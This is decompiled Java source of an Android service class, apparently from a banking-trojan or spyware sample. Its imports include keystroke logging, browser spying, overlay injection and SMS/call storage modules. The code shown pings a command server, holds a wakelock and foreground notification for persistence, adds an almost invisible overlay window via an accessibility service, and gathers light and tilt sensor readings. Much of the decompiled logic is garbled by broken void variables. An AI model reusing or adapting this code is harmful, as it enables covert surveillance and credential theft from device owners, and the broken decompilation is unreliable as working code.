/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Color
 *  android.hardware.Sensor
 *  android.hardware.SensorEvent
 *  android.hardware.SensorEventListener
 *  android.hardware.SensorManager
 *  android.os.AsyncTask
 *  android.os.Build$VERSION
 *  android.os.IBinder
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.provider.Settings
 *  android.view.SurfaceView
 *  android.view.View
 *  android.view.ViewGroup$LayoutParams
 *  android.view.WindowManager
 *  android.view.WindowManager$LayoutParams
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Locale;
import java.util.concurrent.locks.ReentrantLock;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.ConfigManager;
import linker.resourcer.encoder.SmsCallsStorage;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.InjectTargetActivity;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.UtilityHelper$$ExternalSyntheticBackport0;
import linker.resourcer.encoder.LockScreenActivity;
import linker.resourcer.encoder.KeystrokeLogger;
import linker.resourcer.encoder.AccessibilityServiceController;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.WorkerService$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.OverlayActivity;
import linker.resourcer.encoder.BrowserSpyActivity;
import linker.resourcer.encoder.NotificationBuilder;
import linker.resourcer.encoder.CommandConstants;
import linker.resourcer.encoder.SharedPreferencesManager;
import linker.resourcer.encoder.DeviceInformationCollector;
import linker.resourcer.encoder.BroadcastReceiverManager;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class WorkerService
extends Service {
    public static String AngleString;
    public static int DelayScreenshot = 0;
    private static PowerManager.WakeLock LOCK_SERVS;
    public static String LightsString;
    public static ReentrantLock MyLOCK;
    public static AccessibilityServiceController My_Access_inst;
    private static int Notifi_ID = 0;
    private static BroadcastReceiverManager STATUS_MONITOR;
    private static final String TAG = "wake:Wk";
    private static final int UPDATE_INTERVAL = 5000;
    private static Sensor accelerometer;
    private static SensorEventListener lightListener;
    private static Sensor lightSensor;
    public static boolean needsleep;
    private static SurfaceView onscreenview;
    private static SensorEventListener sensorEventListener;
    private static SensorManager sensorManager;
    private static boolean skip98;
    private static volatile long workdats;
    private WindowManager.LayoutParams Lay_params;
    private long lastupdateAngle = 0L;
    private long lastupdateLigths = 0L;

    static {
        DelayScreenshot = 100;
        AngleString = "";
        LightsString = "";
        needsleep = false;
        Notifi_ID = 111;
        skip98 = false;
        workdats = 0L;
    }

    private static void JoinChat(Context context) {
        if (CommandExecutor.instance(context).pingServer()) {
            AndroidLogger.Debug("At.JoinChat", "Ping OK");
        } else {
            AndroidLogger.Debug("At.JoinChat", "Ping NO");
        }
    }

    private void START_FORGRONG(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(Notifi_ID, (Notification)context, 0x40000000);
            } else {
                this.startForeground(Notifi_ID, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    static /* synthetic */ long access$1102(WorkerService lqvpqwmhpvnnlhskxyjdwphzvsl2, long l) {
        lqvpqwmhpvnnlhskxyjdwphzvsl2.lastupdateAngle = l;
        return l;
    }

    static /* synthetic */ long access$2202(long l) {
        workdats = l;
        return l;
    }

    static /* synthetic */ PowerManager.WakeLock access$2402(PowerManager.WakeLock wakeLock) {
        LOCK_SERVS = wakeLock;
        return wakeLock;
    }

    static /* synthetic */ long access$302(WorkerService lqvpqwmhpvnnlhskxyjdwphzvsl2, long l) {
        lqvpqwmhpvnnlhskxyjdwphzvsl2.lastupdateLigths = l;
        return l;
    }

    private void checksinsors() {
        sensorManager = (SensorManager)this.getSystemService("sensor");
        lightSensor = sensorManager.getDefaultSensor(5);
        if (lightSensor != null && lightListener == null) {
            try {
                SensorEventListener sensorEventListener;
                lightListener = sensorEventListener = new SensorEventListener(this){
                    final WorkerService this$0;
                    {
                        this.this$0 = lqvpqwmhpvnnlhskxyjdwphzvsl2;
                    }

                    public void onAccuracyChanged(Sensor sensor, int n) {
                    }

                    /*
                     * WARNING - void declaration
                     * Enabled aggressive block sorting
                     */
                    public void onSensorChanged(SensorEvent object) {
                        block30: {
                            void var1_19;
                            float f;
                            int n;
                            block31: {
                                long l = System.currentTimeMillis();
                                if (l - this.this$0.lastupdateLigths < 5000L) break block30;
                                WorkerService.access$302(this.this$0, l);
                                float[] fArray = object.values;
                                n = 0;
                                f = fArray[0];
                                if (f < 1.0f) {
                                    String string2 = "pitch_black";
                                } else if (f < 10.0f) {
                                    String string3 = "very_dark";
                                } else if (f < 50.0f) {
                                    String string4 = "dim_light";
                                } else if (f < 200.0f) {
                                    String string5 = "indoor";
                                } else if (f < 1000.0f) {
                                    String string6 = "bright_indoor";
                                } else if (f < 10000.0f) {
                                    String string7 = "cloudy";
                                } else if (f < 30000.0f) {
                                    String string8 = "sunny";
                                } else {
                                    String string9 = "direct_sun";
                                }
                                String string10 = Locale.getDefault().getLanguage();
                                switch (string10.hashCode()) {
                                    case 3886: {
                                        if (!string10.equals("zh")) break;
                                        n = 1;
                                        break block31;
                                    }
                                    case 3710: {
                                        if (!string10.equals("tr")) break;
                                        n = 2;
                                        break block31;
                                    }
                                    case 3651: {
                                        if (!string10.equals("ru")) break;
                                        n = 4;
                                        break block31;
                                    }
                                    case 3588: {
                                        if (!string10.equals("pt")) break;
                                        n = 3;
                                        break block31;
                                    }
                                    case 3246: {
                                        if (!string10.equals("es")) break;
                                        n = 5;
                                        break block31;
                                    }
                                    case 3121: {
                                        if (string10.equals("ar")) break block31;
                                    }
                                }
                                n = -1;
                            }
                            switch (n) {
                                default: {
                                    void var1_11;
                                    String string11 = this.this$0.getEnglishLightMessage((String)var1_11);
                                    break;
                                }
                                case 5: {
                                    void var1_11;
                                    String string12 = this.this$0.getSpanishLightMessage((String)var1_11);
                                    break;
                                }
                                case 4: {
                                    void var1_11;
                                    String string13 = this.this$0.getRussianLightMessage((String)var1_11);
                                    break;
                                }
                                case 3: {
                                    void var1_11;
                                    String string14 = this.this$0.getPortugueseLightMessage((String)var1_11);
                                    break;
                                }
                                case 2: {
                                    void var1_11;
                                    String string15 = this.this$0.getTurkishLightMessage((String)var1_11);
                                    break;
                                }
                                case 1: {
                                    void var1_11;
                                    String string16 = this.this$0.getChineseLightMessage((String)var1_11);
                                    break;
                                }
                                case 0: {
                                    void var1_11;
                                    String string17 = this.this$0.getArabicLightMessage((String)var1_11);
                                }
                            }
                            LightsString = (String)var1_19 + " (" + f + " lx)";
                        }
                    }
                };
                sensorManager.registerListener(lightListener, lightSensor, 3);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if ((accelerometer = sensorManager.getDefaultSensor(1)) != null && sensorEventListener == null) {
            sensorEventListener = new SensorEventListener(this){
                final WorkerService this$0;
                {
                    this.this$0 = lqvpqwmhpvnnlhskxyjdwphzvsl2;
                }

                public void onAccuracyChanged(Sensor sensor, int n) {
                }

                /*
                 * WARNING - void declaration
                 * Enabled aggressive block sorting
                 */
                public void onSensorChanged(SensorEvent object) {
                    block26: {
                        void var1_16;
                        int n;
                        block27: {
                            long l = System.currentTimeMillis();
                            if (l - this.this$0.lastupdateAngle < 5000L) break block26;
                            WorkerService.access$1102(this.this$0, l);
                            float f = object.values[0];
                            Object object2 = object.values;
                            n = 1;
                            float f2 = object2[1];
                            float f3 = object.values[2];
                            double d = Math.atan2(f2, Math.sqrt(f * f + f3 * f3)) * 180.0 / Math.PI;
                            double d2 = Math.atan2(-f, f3) * 180.0 / Math.PI;
                            if (Math.abs(d) < 10.0 && Math.abs(d2) < 10.0) {
                                String string2 = "flat";
                            } else if (Math.abs(d) > 70.0) {
                                String string3 = "upright";
                            } else if (Math.abs(d2) > 70.0) {
                                String string4 = "side";
                            } else if (Math.abs(d) > 30.0) {
                                String string5 = "tilted_fb";
                            } else if (Math.abs(d2) > 30.0) {
                                String string6 = "tilted_lr";
                            } else {
                                String string7 = "slightly_tilted";
                            }
                            object2 = Locale.getDefault().getLanguage();
                            switch (((String)object2).hashCode()) {
                                case 3886: {
                                    if (!((String)object2).equals("zh")) break;
                                    break block27;
                                }
                                case 3710: {
                                    if (!((String)object2).equals("tr")) break;
                                    n = 2;
                                    break block27;
                                }
                                case 3651: {
                                    if (!((String)object2).equals("ru")) break;
                                    n = 4;
                                    break block27;
                                }
                                case 3588: {
                                    if (!((String)object2).equals("pt")) break;
                                    n = 3;
                                    break block27;
                                }
                                case 3246: {
                                    if (!((String)object2).equals("es")) break;
                                    n = 5;
                                    break block27;
                                }
                                case 3121: {
                                    if (!((String)object2).equals("ar")) break;
                                    n = 0;
                                    break block27;
                                }
                            }
                            n = -1;
                        }
                        switch (n) {
                            default: {
                                void var1_8;
                                String string8 = this.this$0.getEnglishTranslation((String)var1_8);
                                break;
                            }
                            case 5: {
                                void var1_8;
                                String string9 = this.this$0.getSpanishTranslation((String)var1_8);
                                break;
                            }
                            case 4: {
                                void var1_8;
                                String string10 = this.this$0.getRussianTranslation((String)var1_8);
                                break;
                            }
                            case 3: {
                                void var1_8;
                                String string11 = this.this$0.getPortugueseTranslation((String)var1_8);
                                break;
                            }
                            case 2: {
                                void var1_8;
                                String string12 = this.this$0.getTurkishTranslation((String)var1_8);
                                break;
                            }
                            case 1: {
                                void var1_8;
                                String string13 = this.this$0.getChineseTranslation((String)var1_8);
                                break;
                            }
                            case 0: {
                                void var1_8;
                                String string14 = this.this$0.getArabicTranslation((String)var1_8);
                            }
                        }
                        AngleString = var1_16;
                    }
                }
            };
            sensorManager.registerListener(sensorEventListener, accelerometer, 3);
        }
    }

    private void createoverlay(Context context) {
        int n;
        int n2;
        block29: {
            block27: {
                block28: {
                    block26: {
                        block24: {
                            block25: {
                                n = n2 = -9;
                                if (My_Access_inst != null) break block24;
                                n = n2;
                                if (!Settings.canDrawOverlays((Context)context)) {
                                    return;
                                }
                                n = n2;
                                if (!skip98) break block25;
                                n = n2;
                                n2 = Build.VERSION.SDK_INT >= 26 ? 2038 : 2006;
                                break block26;
                            }
                            n2 = 2998;
                            break block26;
                        }
                        n2 = 2032;
                    }
                    if (n2 == -9) {
                        return;
                    }
                    n = n2;
                    if (onscreenview == null) break block27;
                    n = n2;
                    if (onscreenview.getParent() == null) break block28;
                    n = n2;
                    AndroidLogger.Debug("createoverlay", "already add");
                    return;
                }
                n = n2;
                this.removeoverlay();
            }
            n = n2;
            n = n2;
            SurfaceView surfaceView = new SurfaceView(this.getApplicationContext());
            n = n2;
            onscreenview = surfaceView;
            n = n2;
            onscreenview.setBackgroundColor(Color.parseColor((String)"#00000001"));
            n = n2;
            onscreenview.setVisibility(0);
            n = n2;
            n = n2;
            surfaceView = new WindowManager.LayoutParams(5, 5, n2, -2142501352, -3);
            n = n2;
            this.Lay_params = surfaceView;
            n = n2;
            this.Lay_params.gravity = 8388661;
            n = n2;
            if (My_Access_inst != null) break block29;
            n = n2;
            ((WindowManager)context.getSystemService("window")).addView((View)onscreenview, (ViewGroup.LayoutParams)this.Lay_params);
        }
        n = n2;
        try {
            AccessibilityServiceController.AccessWindow.addView((View)onscreenview, (ViewGroup.LayoutParams)this.Lay_params);
        }
        catch (Exception exception) {
            if (n == 2998) {
                skip98 = true;
            }
            AndroidLogger.Error("createoverlay", exception.getMessage());
            exception.printStackTrace();
        }
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getArabicLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "\u0625\u0636\u0627\u0621\u0629 \u063a\u064a\u0631 \u0645\u0639\u0631\u0648\u0641\u0629";
            }
            case 7: {
                return "\u0636\u0648\u0621 \u0627\u0644\u0634\u0645\u0633 \u0627\u0644\u0645\u0628\u0627\u0634\u0631";
            }
            case 6: {
                return "\u064a\u0648\u0645 \u0645\u0634\u0645\u0633";
            }
            case 5: {
                return "\u064a\u0648\u0645 \u063a\u0627\u0626\u0645";
            }
            case 4: {
                return "\u062f\u0627\u062e\u0644 \u0645\u0634\u0631\u0642";
            }
            case 3: {
                return "\u0625\u0636\u0627\u0621\u0629 \u062f\u0627\u062e\u0644\u064a\u0629";
            }
            case 2: {
                return "\u0625\u0636\u0627\u0621\u0629 \u062e\u0627\u0641\u062a\u0629";
            }
            case 1: {
                return "\u0645\u0638\u0644\u0645 \u062c\u062f\u064b\u0627";
            }
            case 0: 
        }
        return "\u0638\u0644\u0627\u0645 \u062f\u0627\u0645\u0633";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getArabicTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "\u0648\u0636\u0639 \u063a\u064a\u0631 \u0645\u0639\u0631\u0648\u0641";
            }
            case 5: {
                return "\u0645\u0627\u0626\u0644 \u0642\u0644\u064a\u0644\u0627\u064b";
            }
            case 4: {
                return "\u0645\u0627\u0626\u0644 \u0644\u0644\u064a\u0633\u0627\u0631 / \u0627\u0644\u064a\u0645\u064a\u0646";
            }
            case 3: {
                return "\u0645\u0627\u0626\u0644 \u0644\u0644\u0623\u0645\u0627\u0645 / \u0644\u0644\u062e\u0644\u0641";
            }
            case 2: {
                return "\u0639\u0644\u0649 \u062c\u0627\u0646\u0628\u0647";
            }
            case 1: {
                return "\u0648\u0627\u0642\u0641 \u0639\u0645\u0648\u062f\u064a\u0627";
            }
            case 0: 
        }
        return "\u0645\u0633\u0637\u062d \u0639\u0644\u0649 \u0627\u0644\u0637\u0627\u0648\u0644\u0629";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getChineseLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "\u672a\u77e5\u5149\u7ebf";
            }
            case 7: {
                return "\u76f4\u5c04\u9633\u5149";
            }
            case 6: {
                return "\u6674\u5929";
            }
            case 5: {
                return "\u591a\u4e91\u5929";
            }
            case 4: {
                return "\u660e\u4eae\u7684\u5ba4\u5185";
            }
            case 3: {
                return "\u5ba4\u5185\u5149";
            }
            case 2: {
                return "\u5fae\u5149";
            }
            case 1: {
                return "\u975e\u5e38\u6697";
            }
            case 0: 
        }
        return "\u6f06\u9ed1";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getChineseTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "\u672a\u77e5\u4f4d\u7f6e";
            }
            case 5: {
                return "\u8f7b\u5fae\u503e\u659c";
            }
            case 4: {
                return "\u5de6\u53f3\u503e\u659c";
            }
            case 3: {
                return "\u524d\u540e\u503e\u659c";
            }
            case 2: {
                return "\u4fa7\u8eba";
            }
            case 1: {
                return "\u76f4\u7acb";
            }
            case 0: 
        }
        return "\u5e73\u653e\u5728\u684c\u5b50\u4e0a";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getEnglishLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Unknown Light";
            }
            case 7: {
                return "Direct Sunlight";
            }
            case 6: {
                return "Sunny Day";
            }
            case 5: {
                return "Cloudy Day";
            }
            case 4: {
                return "Bright Indoor";
            }
            case 3: {
                return "Indoor Light";
            }
            case 2: {
                return "Dim Light";
            }
            case 1: {
                return "Very Dark";
            }
            case 0: 
        }
        return "Pitch Black";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getEnglishTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Unknown position";
            }
            case 5: {
                return "Slightly tilted";
            }
            case 4: {
                return "Tilted left/right";
            }
            case 3: {
                return "Tilted forward/backward";
            }
            case 2: {
                return "On its side";
            }
            case 1: {
                return "Standing upright";
            }
            case 0: 
        }
        return "Flat on the table";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getPortugueseLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Luz desconhecida";
            }
            case 7: {
                return "Luz solar direta";
            }
            case 6: {
                return "Dia ensolarado";
            }
            case 5: {
                return "Dia nublado";
            }
            case 4: {
                return "Ambiente claro";
            }
            case 3: {
                return "Luz interna";
            }
            case 2: {
                return "Luz fraca";
            }
            case 1: {
                return "Muito escuro";
            }
            case 0: 
        }
        return "Escurid\u00e3o total";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getPortugueseTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Posi\u00e7\u00e3o desconhecida";
            }
            case 5: {
                return "Ligeiramente inclinado";
            }
            case 4: {
                return "Inclinado para esquerda / direita";
            }
            case 3: {
                return "Inclinado para frente / tr\u00e1s";
            }
            case 2: {
                return "De lado";
            }
            case 1: {
                return "Em p\u00e9";
            }
            case 0: 
        }
        return "Plano na mesa";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getRussianLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u044b\u0439 \u0441\u0432\u0435\u0442";
            }
            case 7: {
                return "\u041f\u0440\u044f\u043c\u043e\u0439 \u0441\u043e\u043b\u043d\u0435\u0447\u043d\u044b\u0439 \u0441\u0432\u0435\u0442";
            }
            case 6: {
                return "\u0421\u043e\u043b\u043d\u0435\u0447\u043d\u044b\u0439 \u0434\u0435\u043d\u044c";
            }
            case 5: {
                return "\u041e\u0431\u043b\u0430\u0447\u043d\u044b\u0439 \u0434\u0435\u043d\u044c";
            }
            case 4: {
                return "\u042f\u0440\u043a\u043e\u0435 \u043f\u043e\u043c\u0435\u0449\u0435\u043d\u0438\u0435";
            }
            case 3: {
                return "\u0412\u043d\u0443\u0442\u0440\u0435\u043d\u043d\u0438\u0439 \u0441\u0432\u0435\u0442";
            }
            case 2: {
                return "\u0422\u0443\u0441\u043a\u043b\u044b\u0439 \u0441\u0432\u0435\u0442";
            }
            case 1: {
                return "\u041e\u0447\u0435\u043d\u044c \u0442\u0435\u043c\u043d\u043e";
            }
            case 0: 
        }
        return "\u041f\u043e\u043b\u043d\u0430\u044f \u0442\u0435\u043c\u043d\u043e\u0442\u0430";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getRussianTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u043e\u0435 \u043f\u043e\u043b\u043e\u0436\u0435\u043d\u0438\u0435";
            }
            case 5: {
                return "\u0421\u043b\u0435\u0433\u043a\u0430 \u043d\u0430\u043a\u043b\u043e\u043d\u0451\u043d";
            }
            case 4: {
                return "\u041d\u0430\u043a\u043b\u043e\u043d\u0451\u043d \u0432\u043b\u0435\u0432\u043e / \u0432\u043f\u0440\u0430\u0432\u043e";
            }
            case 3: {
                return "\u041d\u0430\u043a\u043b\u043e\u043d\u0451\u043d \u0432\u043f\u0435\u0440\u0435\u0434 / \u043d\u0430\u0437\u0430\u0434";
            }
            case 2: {
                return "\u041d\u0430 \u0431\u043e\u043a\u0443";
            }
            case 1: {
                return "\u0421\u0442\u043e\u0438\u0442 \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u044c\u043d\u043e";
            }
            case 0: 
        }
        return "\u041b\u0435\u0436\u0438\u0442 \u043d\u0430 \u0441\u0442\u043e\u043b\u0435";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getSpanishLightMessage(String string2) {
        int n;
        block20: {
            switch (string2.hashCode()) {
                case 224161014: {
                    if (!string2.equals("direct_sun")) break;
                    n = 7;
                    break block20;
                }
                case 109799703: {
                    if (!string2.equals("sunny")) break;
                    n = 6;
                    break block20;
                }
                case -696236480: {
                    if (!string2.equals("pitch_black")) break;
                    n = 0;
                    break block20;
                }
                case -1085442248: {
                    if (!string2.equals("bright_indoor")) break;
                    n = 4;
                    break block20;
                }
                case -1184229805: {
                    if (!string2.equals("indoor")) break;
                    n = 3;
                    break block20;
                }
                case -1244902177: {
                    if (!string2.equals("very_dark")) break;
                    n = 1;
                    break block20;
                }
                case -1268935009: {
                    if (!string2.equals("dim_light")) break;
                    n = 2;
                    break block20;
                }
                case -1357518620: {
                    if (!string2.equals("cloudy")) break;
                    n = 5;
                    break block20;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Luz desconocida";
            }
            case 7: {
                return "Luz solar directa";
            }
            case 6: {
                return "D\u00eda soleado";
            }
            case 5: {
                return "D\u00eda nublado";
            }
            case 4: {
                return "Interior brillante";
            }
            case 3: {
                return "Luz interior";
            }
            case 2: {
                return "Luz tenue";
            }
            case 1: {
                return "Muy oscuro";
            }
            case 0: 
        }
        return "Oscuridad total";
    }

    /*
     * Enabled aggressive block sorting
     */
    private String getSpanishTranslation(String string2) {
        int n;
        block16: {
            switch (string2.hashCode()) {
                case 3530071: {
                    if (!string2.equals("side")) break;
                    n = 2;
                    break block16;
                }
                case 3145593: {
                    if (!string2.equals("flat")) break;
                    n = 0;
                    break block16;
                }
                case -221275039: {
                    if (!string2.equals("upright")) break;
                    n = 1;
                    break block16;
                }
                case -416348023: {
                    if (!string2.equals("tilted_lr")) break;
                    n = 4;
                    break block16;
                }
                case -416348225: {
                    if (!string2.equals("tilted_fb")) break;
                    n = 3;
                    break block16;
                }
                case -718108181: {
                    if (!string2.equals("slightly_tilted")) break;
                    n = 5;
                    break block16;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                return "Posici\u00f3n desconocida";
            }
            case 5: {
                return "Ligeramente inclinado";
            }
            case 4: {
                return "Inclinado hacia la izquierda/derecha";
            }
            case 3: {
                return "Inclinado hacia adelante/atr\u00e1s";
            }
            case 2: {
                return "De lado";
            }
            case 1: {
                return "De pie";
            }
            case 0: 
        }
        return "Plano sobre la mesa";
    }
